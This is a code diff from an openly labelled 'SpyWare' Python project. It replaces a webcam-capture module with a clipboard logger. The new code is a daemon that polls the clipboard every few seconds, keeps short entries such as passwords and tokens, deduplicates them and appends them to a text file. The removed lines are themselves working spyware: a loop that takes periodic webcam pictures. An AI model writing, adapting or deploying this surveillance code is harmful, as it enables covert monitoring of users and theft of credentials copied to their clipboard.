@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 ###################
-#    This file implements a SpyWare to take picture with Webcam.
+#    This package implements a SpyWare to capture the clipboard.
 #    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
@@ -20,16 +20,16 @@
 ###################
 
 """
-This file implements a SpyWare to take picture with Webcam.
+This package implements a SpyWare to capture the clipboard.
 
-~# python3 WebcamLogger.py keySpy.conf
+~# python3 ClipboardLogger.py clipboardSpy.conf
 
 >>> from os import environ
->>> environ['webcamSpy.conf'] = 'webcamSpy.conf'
->>> from SpyWare.WebcamLogger import webcamSpy
->>> webcamSpy()                  # (using env) OR
->>> webcamSpy('webcamSpy.conf')  # (using config file name) OR
->>> webcamSpy(argv=["WebcamLogger.py", "webcamSpy.conf"]) # (using argv)
+>>> environ['clipboardSpy.conf'] = 'clipboardSpy.conf'
+>>> from SpyWare.ClipboardLogger import clipboardSpy
+>>> clipboardSpy()                    # (using env) OR
+>>> clipboardSpy('clipboardSpy.conf') # (using config file name) OR
+>>> clipboardSpy(argv=["ClipboardLogger.py", "clipboardSpy.conf"]) # (using argv)
 """
 
 __version__ = "1.0.0"
@@ -38,7 +38,7 @@ __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
-This file implements a complete spyware.
+This package implements a SpyWare to capture the clipboard.
 """
 license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/SpyWare"
@@ -54,14 +54,13 @@ __copyright__ = copyright
 
 __all__ = ["Daemon", "main", "config_load"]
 
-from os.path import join, dirname, exists
-from cv2 import VideoCapture, imwrite
+from os.path import join, exists, dirname
 from configparser import ConfigParser
-from os import makedirs, environ
+from pyperclip import paste
 from sys import argv, exit
 from typing import List
+from os import environ
 from time import sleep
-from glob import glob
 
 
 class CONFIGURATIONS:
@@ -70,9 +69,8 @@ class CONFIGURATIONS:
     This class contains configurations.
     """
 
-    save_filename: str = "webcam*.png"
-    save_dirname: str = "pictures"
-    picture_interval: int = 3600
+    save_filename: str = "clipboard.txt"
+    internval: float = 11
 
 
 def config_load(filename: str = None, argv: List[str] = argv) -> int:
@@ -82,8 +80,8 @@ def config_load(filename: str = None, argv: List[str] = argv) -> int:
     """
 
     CONFIG = ConfigParser()
-    default_file_name = "webcamSpy.conf"
 
+    default_file_name = "clipboardSpy.conf"
     default_file_path = join(dirname(__file__), default_file_name)
     env_config_file = environ.get(default_file_name)
     arg_config_file = argv[1] if len(argv) == 2 else None
@@ -101,13 +99,10 @@ def config_load(filename: str = None, argv: List[str] = argv) -> int:
 
     CONFIG = CONFIG.__dict__["_sections"]
     CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
-        "filename", "webcam*.png"
+        "filename", "clipboard.txt"
     )
-    CONFIGURATIONS.save_dirname = CONFIG.get("SAVE", {}).get(
-        "dirname", "pictures"
-    )
-    CONFIGURATIONS.picture_interval = float(
-        CONFIG.get("TIME", {}).get("picture_interval", "3600")
+    CONFIGURATIONS.internval = float(
+        CONFIG.get("TIME", {}).get("internval", "11")
     )
     return 0
 
@@ -115,50 +110,104 @@ def config_load(filename: str = None, argv: List[str] = argv) -> int:
 class Daemon:
 
     """
-    This class implements a loop to capture picture for ever.
+    This class implements a loop to get clipboard for ever.
     """
 
     def __init__(self):
-        self.path = join(
-            CONFIGURATIONS.save_dirname, CONFIGURATIONS.save_filename
-        )
-        self.interval = CONFIGURATIONS.picture_interval
-        self.increment = len(glob(self.path))
+        self.internval = CONFIGURATIONS.internval
+        path = self.path = CONFIGURATIONS.save_filename
+        create_if_not_exists(path)
+        self.data_file = open(path)
+        self.data = ""
         self.run = True
 
     def run_for_ever(self) -> None:
 
         """
-        This function takes picture from webcam and wait.
+        This function implements a loop to get clipboard for ever.
         """
 
-        makedirs(CONFIGURATIONS.save_dirname, exist_ok=True)
-        path = self.path
-        interval = self.interval
-        increment = self.increment
+        persistent_save = self.persistent_save
+        internval = self.internval
+        save = self.save
+        counter = 0
 
         while self.run:
-            camera = VideoCapture(0)
-            return_value, image = camera.read()
-            del camera
+            clipboard = paste()
+            counter += 1
 
-            imwrite(path.replace("*", str(increment)), image)
-            increment += 1
+            if len(clipboard) > 75:
+                clipboard = ""
+            else:
+                save(clipboard)
+
+            if counter >= 150:
+                persistent_save()
+                counter = 0
 
             if self.run:
-                sleep(interval)
+                sleep(internval)
+
+    def save(self, clipboard: str) -> None:
+
+        """
+        This function saves clipboard if isn't save before.
+        """
+
+        clipboard = f"{repr(clipboard)}\n"
+        data_file = self.data_file
+        data_file.seek(0)
+        readline = data_file.readline
+
+        data = readline()
+
+        if clipboard in self.data:
+            return None
+
+        while data:
+            if clipboard == data:
+                return None
+            data = readline()
+
+        self.data += clipboard
+
+    def persistent_save(self) -> None:
+
+        """
+        This function saves data in file.
+        """
+
+        path = self.path
+        self.data_file.close()
+
+        with open(path, "a") as file:
+            file.write(self.data)
+
+        self.data = ""
+        self.data_file = open(path)
+
+
+def create_if_not_exists(filename: str) -> None:
+
+    """
+    This function creates file if not exists.
+    """
+
+    if not exists(filename):
+        file = open(filename, "w")
+        file.write("")
+        file.close()
 
 
 def main(config_filename: str = None, argv: List[str] = argv) -> int:
 
     """
-    This function executes this script from the command line.
+    This function starts the clipboard logger.
     """
 
     config_load(filename=config_filename, argv=argv)
 
     daemon = Daemon()
-
     try:
         daemon.run_for_ever()
     except KeyboardInterrupt:
